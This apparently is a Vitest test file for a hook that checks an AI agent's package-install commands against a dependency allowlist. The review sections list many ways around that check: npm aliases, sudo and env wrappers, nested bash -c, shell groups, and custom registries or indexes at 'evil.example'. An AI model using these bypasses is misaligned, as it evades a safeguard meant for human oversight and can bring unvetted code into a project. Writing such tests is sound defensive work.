import { describe, expect, it } from "vitest";
import { evaluate } from "../src/evaluate.js";
import { npmAliasTarget } from "../src/deps.js";
import { installProblems } from "../src/installs.js";
import { defaultPolicy, PROJECT } from "./helpers.js";

const agent = { projectDir: PROJECT, humanSession: false };
const policy = defaultPolicy({ allowedDependencies: { npm: ["zod", "@types/node"], pypi: ["requests"] } });
const run = (command: string, ctx = agent) => evaluate({ tool_name: "Bash", tool_input: { command } }, policy, ctx);

describe("Bash install commands vs. allowlist", () => {
  it.each([
    "npm install lodash",
    "npm i lodash",
    "npm i -D lodash@4.17.21",
    "npm install --save-dev lodash",
    "npm install -g lodash",
    "npm --prefix x install lodash",
    "pnpm add lodash",
    "pnpm install lodash",
    "yarn add lodash",
    "yarn add zod lodash",
    "bun add lodash",
    "pip install flask",
    "pip3 install flask==3.0",
    "python3 -m pip install flask",
    "uv pip install flask",
    "pip install requests flask",
    "npm install zod && npm install lodash",
    "bash -c 'npm install lodash'",
    "FOO=1 npm install lodash",
    "sudo npm install lodash",
    "npm install npm:lodash@4",
    "npm install github:a/b",
    "npm install a/b",
    "npm install ./local",
    "npm install https://x.example/p.tgz",
    "npm install $PKG",
    "pip install -r requirements.txt",
    "pip install git+https://x.example/r.git",
    "pip install --index-url https://evil.example requests",
  ])("blocks %s", (cmd) => {
    const d = run(cmd);
    expect(d.allowed).toBe(false);
    expect(run(cmd, { projectDir: PROJECT, humanSession: true }).allowed).toBe(false);
  });
  it.each([
    "npm install",
    "npm ci",
    "npm i",
    "yarn install",
    "pnpm install --frozen-lockfile",
    "npm install zod",
    "npm install zod@4.1.0 --save-exact",
    "npm i -D @types/node",
    "pnpm add zod",
    "pip install requests",
    "pip install 'Requests>=2'",
    "python3 -m pip install 'requests[socks]==2'",
    "npm run build",
    "npm test",
    "pip list",
    "echo npm install lodash",
  ])("allows %s", (cmd) => expect(run(cmd).allowed).toBe(true));

  it("reports the blocked package", () => {
    const d = run("npm install lodash");
    expect(d).toMatchObject({ allowed: false });
    expect((d as { reason: string }).reason).toContain("npm:lodash");
  });
  it("blocks everything with the empty bundled allowlist", () => {
    expect(installProblems("npm install zod", { npm: [], pypi: [] })).toEqual(["npm:zod"]);
  });
});

describe("Review PR #84: Umgehungen", () => {
  const blocked = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(false);
  const allowed = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(true);
  it("1: npm-Alias in der Versionsangabe", () => {
    blocked("npm i zod@npm:lodash");
    blocked("npm install zod@npm:lodash@4");
    allowed("npm i zod@npm:zod@4");
  });
  it("2: globale pip-Optionen vor install", () => {
    for (const c of ["pip -q install flask", "pip --quiet install flask", "pip -v install flask", "pip --isolated install flask", "pip --index-url https://evil.example install requests", "pip --python /x/py install flask"]) blocked(c);
    allowed("pip -q install requests");
  });
  it("3: python -mpip, pipx, uv tool", () => {
    for (const c of ["python3 -mpip install flask", "python3 -m pipx install flask", "uv tool install flask", "uv add flask", "python3 -u -m pip install flask"]) blocked(c);
    allowed("python3 -mpip install requests");
  });
  it("4: Wrapper mit Wert-Flag", () => {
    for (const c of ["sudo -u root npm i lodash", "env -u X npm i lodash", "timeout 5 npm i lodash", "nice -n 5 npm i lodash", "timeout -s KILL 5 pip install flask", "sudo -- npm i lodash"]) blocked(c);
    allowed("sudo -u root npm i zod");
  });
  it("5: Schluesselwoerter und Gruppen", () => {
    for (const c of ["{ npm i lodash; }", "if true; then npm i lodash; fi", "while true; do npm i lodash; done", "! npm i lodash", "( npm i lodash )"]) blocked(c);
    allowed("if true; then npm i zod; fi");
  });
  it("6: yarn global / workspace", () => {
    blocked("yarn global add lodash");
    blocked("yarn workspace a add lodash");
    allowed("yarn workspace a add zod");
  });
  it("7: eigene Registry", () => {
    for (const c of ["npm --registry=https://evil.example i zod", "npm i zod --registry https://evil.example", "npm i zod --registry=https://evil.example", "npm i zod --@s:registry=https://evil.example", "pnpm add zod --registry=https://evil.example"]) blocked(c);
  });
  it("8: Tiefe ist fail-closed, bash -c --", () => {
    blocked("bash -c -- 'npm i lodash'");
    const wrap = (c: string): string => `bash -c '${c.replace(/'/g, "'\\''")}'`;
    let deep = "true";
    for (let n = 0; n < 7; n++) deep = wrap(deep);
    blocked(deep);
    let deepInstall = "npm i lodash";
    for (let n = 0; n < 7; n++) deepInstall = wrap(deepInstall);
    blocked(deepInstall);
    expect(installProblems(wrap(wrap("true")), { npm: [], pypi: [] }, 3)).toEqual(["command nesting too deep to verify"]);
    blocked("bash -c 'npm i \"lodash'");
  });
  it("Gross-/Kleinschreibung", () => {
    blocked("NPM install lodash");
    blocked("npm INSTALL lodash");
    blocked("PIP install flask");
    allowed("NPM install ZOD");
  });
});

describe("Re-Review PR #84: A bis D", () => {
  const blocked = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(false);
  const allowed = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(true);
  it("A: npm:-Praefix ohne Beachtung der Schreibweise (Bash und Manifest)", () => {
    for (const c of ["npm i zod@NPM:lodash", "npm i zod@Npm:lodash", "npm i NPM:lodash"]) blocked(c);
    allowed("npm i zod@NPM:zod");
    const manifest = JSON.stringify({ dependencies: { zod: "NPM:lodash" } });
    expect(evaluate({ tool_name: "Write", tool_input: { file_path: "/repo/package.json", content: manifest } }, policy, agent).allowed).toBe(false);
    expect(npmAliasTarget("NPM:lodash@1")).toBe("lodash");
  });
  it("B: -w ist nur bei npm ein Wert-Flag", () => {
    for (const c of ["pnpm add -w lodash", "pnpm add -D -w lodash", "pnpm -w add lodash", "npm i -w pkg lodash", "npm i -w=pkg lodash"]) blocked(c);
    allowed("pnpm add -w zod");
    allowed("npm i -w pkg zod");
  });
  it("C: gebuendelte Kurzflags bei Wrappern", () => {
    for (const c of ["sudo -Hu root npm i lodash", "sudo -nu root npm i lodash", "sudo -iu root npm i lodash", "sudo -ku root npm i lodash", "sudo -Eu root npm i lodash", "env -iu X npm i lodash", "sudo -uroot npm i lodash"]) blocked(c);
    allowed("sudo -Hu root npm i zod");
    allowed("sudo -uroot npm i zod");
  });
  it("D: uv mit globalen Optionen und Index-Optionen", () => {
    for (const c of ["uv --directory d pip install flask", "uv --project p pip install flask", "uv --python 3.12 add flask", "uv pip install --index=https://evil.example requests", "uv pip install --default-index=https://evil.example requests", "uv pip install --index https://evil.example requests", "pip install -qr req.txt"]) blocked(c);
    allowed("uv --directory d pip install requests");
    allowed("uv --python 3.12 add requests");
  });
});

describe("Re-Review 2 PR #84: E (uv-Globaloptionen)", () => {
  const blocked = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(false);
  const allowed = (cmd: string) => expect(run(cmd).allowed, cmd).toBe(true);
  it("E: uv-Globaloptionen mit Wert, auch unbekannte", () => {
    for (const c of [
      "uv --python-preference managed pip install flask",
      "uv --allow-insecure-host h pip install flask",
      "uv --index-strategy first-index pip install flask",
      "uv --python-fetch automatic pip install flask",
      "uv --keyring-provider subprocess add flask",
      "uv --unbekannt wert pip install flask",
      "uv --unbekannt wert tool install flask",
    ]) blocked(c);
    for (const c of ["uv --python-preference managed pip install requests", "uv --unbekannt wert add requests", "uv --native-tls pip install requests", "uv pip install -p 3.12 requests"]) allowed(c);
  });
  it("E: uv sync/run werden nicht blockiert", () => {
    for (const c of ["uv sync", "uv run pytest", "uv --python-preference managed sync", "uv --unbekannt wert run pytest", "uv lock"]) allowed(c);
  });
});

describe("Abnahmetest 2026-10-24: Shell-Umleitungen sind keine Paketargumente", () => {
  const allowedList = { npm: ["zod"], pypi: ["requests"] };
  const problems = (cmd: string) => installProblems(cmd, allowedList);
  it("meldet bei Umleitungen nur das Paket, nicht Operator, Ziel oder Deskriptor", () => {
    for (const c of [
      "npm install lodash 2>&1 | tail",
      "npm install lodash 2>&1",
      "npm install lodash >log.txt",
      "npm install lodash >> log.txt",
      "npm install lodash < /dev/null",
      "npm install lodash 2>/dev/null",
      "npm install lodash &>log",
      "npm install lodash &>> log",
      "npm install lodash 1>&2",
      "npm install lodash 10>&1 3<&0",
      "npm install lodash >| out 2>&-",
      "npm install lodash > \"$LOG\"",
      "npm i lodash>out",
      "npm install lodash <<EOF\nx\nEOF",
      "pnpm add lodash 2>&1 | tail -n 5",
    ]) expect(problems(c), c).toEqual(["npm:lodash"]);
    expect(problems("pip install flask 2>&1 | tail")).toEqual(["pypi:flask"]);
  });
  it("Installation ohne Paket bleibt mit Umleitung erlaubt", () => {
    for (const c of ["npm install 2>&1", "npm install 2>&1 | tail", "npm ci > /dev/null 2>&1", "npm i 2>err.log", "npm install zod 2>&1 | tail", "pip install requests 2>/dev/null"]) {
      expect(problems(c), c).toEqual([]);
      expect(run(c).allowed, c).toBe(true);
    }
  });
  it("prueft wie die Shell: ein Deskriptor zaehlt nur unquotiert und direkt vor dem Operator", () => {
    // `2 >x` und `"2">x`: die Shell uebergibt "2" als Argument (Paketname 2).
    expect(problems("npm install 2 >x")).toEqual(["npm:2"]);
    expect(problems('npm install "2">x')).toEqual(["npm:2"]);
    expect(problems("npm install x2>y")).toEqual(["npm:x2"]);
    // Maskierter Operator ist Teil des Worts: kein Umleitungsziel, sondern unpruefbare Angabe.
    expect(problems("npm install a\\>b")).toEqual(["npm:a>b (unverifiable source)"]);
  });
  it("keine neue Umgehung: Umleitung vor dem Befehl, Befehle im Ziel, unklare Woerter bleiben fail-closed", () => {
    // Vorher wurde der Befehl hinter einer vorangestellten Umleitung nicht erkannt (Kopf `2` bzw. `>`).
    for (const c of ["2>/dev/null npm install lodash", ">/dev/null npm i lodash", "sudo 2>/dev/null npm i lodash", "FOO=1 >x npm i lodash"]) {
      expect(problems(c), c).toEqual(["npm:lodash"]);
      expect(run(c).allowed, c).toBe(false);
    }
    expect(problems("npm install zod >$(npm install lodash)")).toEqual(["npm:lodash"]);
    expect(problems("npm install zod > >(npm install lodash)")).toContain("npm:lodash");
    expect(problems("npm install $PKG 2>&1")).toEqual(["unresolved package argument"]);
    expect(run("npm install lodash 2>&1 | tail").allowed).toBe(false);
  });
});
